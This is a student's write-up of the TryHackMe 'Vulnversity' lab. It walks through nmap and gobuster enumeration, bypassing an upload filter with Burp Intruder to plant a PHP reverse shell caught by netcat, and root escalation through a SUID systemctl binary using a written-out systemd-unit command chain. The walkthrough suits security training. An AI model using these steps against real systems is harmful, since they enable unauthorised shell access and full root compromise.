# Vulnversity \(L\) \(wlk\)

_TryHackMe_ **-** [**Vulnversity**](https://tryhackme.com/room/vulnversity) ****Write-Up

_topics_: active reconnaissance, web app attacks, privesc

## 1\) Enumeration \(nmap\)

* `nmap -sC -sV -oN nmap/initial` 

    sC: Scan with the default nmap scripts

    sV: Attempts to determine the version of the services running

    oN: Output scan in normal

* scan found with 6 open ports \(21,22, 139, 445, 3128, 3333\)
* server runs on 3333
* squid proxy version 3.5.12
* nmap flag -n will not resolve DNS &lt;-------------- !!REVISIT!!
* most likely OS: Ubuntu \(Samba 4.3.11\)

## 2\) Hidden Web Directories \(gobuster\)

* `gobuster dir -u http://:port -w` 
  * dir: uses directory/file bruteforce mode
  * locate dirbuster: listed file locations with default dirbuster wordlists
* website: [http://10.10.83.87:3333](http://10.10.83.87:3333) **: must specify port!**
* gobuster found 6 hidden directories \(images, css, js, fonts,internal, server-status\)
* [http://10.10.83.87:3333/internal/](http://10.10.83.87:3333/internal/) is the directory with an upload form page \(can upload malicious files\)
* hidden directories on GNU system: `ls -R` or `find . -type f -name *`

## 3\) Local Privilege Escalation - 

#### Compromise the webserver \(burpsuite, intruder, netcat\) 4.1a\) **python script to test passwords**

* [https://github.com/810hd/pythonBruteForcePasswords/blob/master/pythonBruteForcePasswords.py](https://github.com/810hd/pythonBruteForcePasswords/blob/master/pythonBruteForcePasswords.py)

  4.1\) Burpsuite overview: Graphical tool for web app security

* once the browser gets a CA certificate from Burp, it has the capability to intercept all traffic over HTTPS, 
* Burp lists on 127.0.0.1 so the browser traffic must be manually configured to be redirected on localhost

  4.2\) Intruder \(burpsuite tool\)

* Intruder takes wordlist payloads to guess which files are allowed
* upload random .php file and delete content-disposition until the file name between special character
* the permitted file extension will have a different length than the others as it omits the error message attached. \(phtml\)

  4.3\) netcat \(_nc -lvnp_ \)

* uses PHP reverse shell \(established from the target host and forces connection\) as payload 
* Listens for incoming connections on port 4444 \(edited this and eth0 IP on reverse shell.phtml and listens on `nc -lvnp 4444`\)
* once this shell is uploaded to the website, navigate to /uploads/ to execute the shell and netcat returns the shell
* which user was running server? run command to list all users \(bill\)
* user flag was blantly in /home/bill

## 4\) Root Privilege Escalation

 `find / -perm /4000 -type f -exec ls -lda {} \; 2>/dev/null` list all SUID files

* at this point the machine is compromised and we have a low-privilege shell \(user inerface for OS\)
* SUID \(set owner userID on execution\) is a unique file permission given to a file. **SUID gives temporary permissions to a user to run the file as if they were the file owner**
* /bin/systemctl, the binary file for systemctl \(which controls all system daemons, the services on the OS\) is set to SUID. Which will allow us the control of the program that oversees all other programs. 
* **target system allows any logged in user to create a system service and run it as root**

  Below is list of commands in order to get the root flag. We must create a service and use it to read the root flag. 

  * `eop=$(mktemp).service`: creates an environment variable \(allow you to customize how the system works and the behavior of the applications on the system with name and value\) called eop, within the variable we call _mktemp_ command to create a temporary file as a systemd service unit file
  * `echo '[Service]`: start config file....calls echo command to echo input. Not including the ending quote enables to enter multiple single line inputs to complete systemd unit file
  * `ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"`: when the service calls the default system shell, the -c option executes everything inside the quote. It reads the root.txt flag and outputs the content of that file to the /tmp directory. 
  * `[Install]:` second part of unit file
  * `WantedBy=multi-user.target' > $eop`: end config file....sets the state \(runlevel\) where the service will run. Now the ending quote is included and all input is directed to the eop environment variable
  * `/bin/systemctl link $eop`: makes the unit file available for systemctl commands, despite it's outside of the standard search path
  * `/bin/systemctl enable --now $eop`: enable one or more unit instances, creates set of symlinks \(encoded in the \[Install\] sections of unit files\). Once they're created, the system manager config is reloaded. This does not start the unit files unless --now is enabled. 
  * `cd /tmp, ls -la | grep output; cat output`: self explanatory

